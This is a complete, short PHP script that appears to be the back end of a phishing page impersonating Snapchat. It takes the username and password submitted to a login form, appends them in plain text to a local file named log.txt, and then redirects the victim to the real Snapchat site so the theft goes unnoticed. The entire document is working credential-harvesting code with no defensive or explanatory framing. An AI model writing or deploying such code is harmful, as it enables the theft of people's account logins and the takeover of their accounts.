<?php
if (isset($_POST['username']) && isset($_POST['password'])) {
    $file = fopen("log.txt", "a");
    fwrite($file, "Username: " . $_POST['username'] . " | Password: " . $_POST['password'] . "\n");
    fclose($file);
    header("Location: https://www.snapchat.com");
    exit();
}
?>
